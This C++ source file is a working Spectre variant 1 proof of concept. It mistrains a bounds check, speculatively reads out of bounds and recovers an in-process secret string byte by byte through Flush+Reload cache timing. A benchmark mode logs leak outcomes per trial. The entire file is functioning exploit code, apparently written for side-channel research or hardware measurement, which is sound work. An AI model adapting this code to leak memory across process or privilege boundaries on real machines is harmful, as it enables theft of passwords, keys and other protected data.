#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <emmintrin.h>
#include <sched.h>
#include <stdint.h>
#include <sys/mman.h>
#include <x86intrin.h>

#include "../common/probe.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef CACHELINE_SIZE
#define CACHELINE_SIZE 64
#endif
#ifndef ITERS
#define ITERS 1000
#endif
#ifndef TRAIN_REPS
#define TRAIN_REPS 100
#endif
#ifndef THRESHOLD
#define THRESHOLD 120
#endif
#ifndef ARRAY_SIZE
#define ARRAY_SIZE 16
#endif
#ifndef NUM_PAGES
#define NUM_PAGES 256
#endif

static volatile size_t array_size = ARRAY_SIZE;
static unsigned char public_array[ARRAY_SIZE];
static unsigned char *array = public_array;
static unsigned char *probe_buf;
static volatile unsigned char temp = 0;
static const char secret[] = "this is my super secret value!";
static volatile unsigned char target_byte_storage = 0;
alignas(64) static volatile unsigned char dummy_flush_byte = 0;

__attribute__((noinline))
static void victim(size_t x) {
    _mm_clflush((void *)&array_size);
    _mm_lfence();

    if (x < array_size) {
        unsigned char secret_byte = array[x];
        volatile unsigned char x = probe_buf[PAGE_SIZE * secret_byte];
    }
}

static inline long time_load(void *ptr) {
    unsigned int junk = 0;
    unsigned long long start = __rdtscp(&junk);
    *(volatile unsigned char *)ptr;
    return (long)(__rdtscp(&junk) - start);
}

#define TIME_LOAD(ptr) time_load((void *)(ptr))

static unsigned int lcg_next(unsigned int state) {
    return state * 1664525u + 1013904223u;
}

static int probe(void *buf, int num_slots, int threshold, int *order, unsigned int *lcg_state) {
    for (int i = 0; i < num_slots; ++i) {
        order[i] = i;
    }
    for (int i = num_slots - 1; i > 0; --i) {
        *lcg_state = lcg_next(*lcg_state);
        int j = (int)(*lcg_state % (unsigned int)(i + 1));
        int tmp = order[i];
        order[i] = order[j];
        order[j] = tmp;
    }

    for (int i = 0; i < num_slots; ++i) {
        int page = order[i];
        char *ptr = (char *)buf + page * PAGE_SIZE;
        if (TIME_LOAD(ptr) < threshold) {
            return page;
        }
    }

    return -1;
}

void* alloc_buf(int num_pages) {
    void* buf = mmap(NULL, PAGE_SIZE*num_pages, PROT_READ | PROT_WRITE
        , MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    memset(buf, 1, PAGE_SIZE*num_pages);

    return buf;
}

void flush_buffer(void* buf, int buf_sz) {
    for (int i = 0; i < buf_sz; i += CACHELINE_SIZE) {
        _mm_clflush((char*)buf + i);
    }
    _mm_lfence();
}

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }
}

__attribute__((noinline))
void initialize_array() {
    for (int i = 0; i < ARRAY_SIZE; ++i) {
        array[i] = (unsigned char)(i + 1);
    }
}

__attribute__((noinline))
static void train_then_attack(size_t malicious_x, unsigned int attempt,
                              const void *flush_addr) {
    size_t training_x = attempt % ARRAY_SIZE;

    for (volatile int j = 0; j <= TRAIN_REPS; ++j) {
        _mm_clflush(flush_addr);
        _mm_lfence();
        size_t x = (j == TRAIN_REPS) ? malicious_x : training_x;
        victim(x);
    }
}

static int run_bench_byte(unsigned char target_value, int num_trials, int threshold,
                          int flush_target) {
    const int cpu = 0;
    pin_cpu(cpu);
    initialize_array();
    target_byte_storage = target_value;
    probe_buf = (unsigned char *)alloc_buf(NUM_PAGES);

    uintptr_t diff = (uintptr_t)&target_byte_storage - (uintptr_t)array;
    int order[SPECEXP_NUM_PAGES];
    unsigned int lcg_state = 1;
    const char *variant = flush_target ? "v1-flush" : "v1";

    fprintf(stderr, "%s bench: target=0x%02x trials=%d threshold=%d\n",
            variant, target_value, num_trials, threshold);
    printf("variant,trial,outcome,leaked_value\n");

    const int skip_low = ARRAY_SIZE + 1;
    const void *flush_addr = flush_target ? (const void *)&target_byte_storage
                                          : (const void *)&dummy_flush_byte;
    for (int t = 0; t < num_trials; ++t) {
        specexp_flush_buffer(probe_buf, (size_t)PAGE_SIZE * NUM_PAGES);
        train_then_attack((size_t)diff, (unsigned int)t, flush_addr);
        int found = specexp_probe_argmin(probe_buf, SPECEXP_NUM_PAGES, threshold,
                                         skip_low, order, &lcg_state);
        printf("%s,%d,%s,%d\n", variant, t, specexp_outcome(found, (int)target_value), found);
    }
    return 0;
}

int main(int argc, char **argv) {
    int bench_mode = 0;
    int flush_target = 0;
    unsigned long target_value = 0xa5;
    int num_trials = 10000;
    int threshold = 120;

    for (int i = 1; i < argc; ++i) {
        if (!strcmp(argv[i], "--bench-byte") && i + 1 < argc) {
            bench_mode = 1;
            target_value = strtoul(argv[++i], nullptr, 0);
        } else if (!strcmp(argv[i], "--trials") && i + 1 < argc) {
            num_trials = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "--threshold") && i + 1 < argc) {
            threshold = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "--flush-target")) {
            flush_target = 1;
        }
    }

    if (bench_mode) {
        return run_bench_byte((unsigned char)target_value, num_trials, threshold, flush_target);
    }

    const int cpu = 0;
    const int secret_len = (int)strlen(secret);
    char guessed[sizeof(secret)] = {};
    uintptr_t diff = (uintptr_t)secret - (uintptr_t)array;

    pin_cpu(cpu);
    initialize_array();

    probe_buf = (unsigned char *)alloc_buf(NUM_PAGES);

    int order[NUM_PAGES];
    unsigned int lcg_state = 1;

    printf("array=%p secret=%p malicious_base_x=%zu\n",
           (void *)array, (const void *)secret, (size_t)diff);

    for (int byte = 0; byte < secret_len; ++byte) {
        int scores[NUM_PAGES] = {};
        size_t malicious_x = (size_t)(diff + (uintptr_t)byte);

        for (int i = 0; i < ITERS; ++i) {
            flush_buffer(probe_buf, PAGE_SIZE * NUM_PAGES);
            train_then_attack(malicious_x, (unsigned int)i, (const void *)&dummy_flush_byte);

            int found = probe(probe_buf, NUM_PAGES, THRESHOLD, order, &lcg_state);
            if (found >= 0) {
                scores[found]++;
            }
        }

        int best = -1;
        int best_count = 0;
        for (int page = 0; page < NUM_PAGES; ++page) {
            if (page >= 1 && page <= ARRAY_SIZE) {
                continue;
            }
            if (scores[page] > best_count) {
                best = page;
                best_count = scores[page];
            }
        }

        guessed[byte] = best >= 0 ? (char)best : '_';
        printf("secret[%2d]: best=0x%02x hit_rate=%.2f%%\n",
               byte, best, 100.0 * (double)best_count / (double)ITERS);
    }

    printf("expected: %s\n", secret);
    printf("received: %s\n", guessed);
    return temp;
}
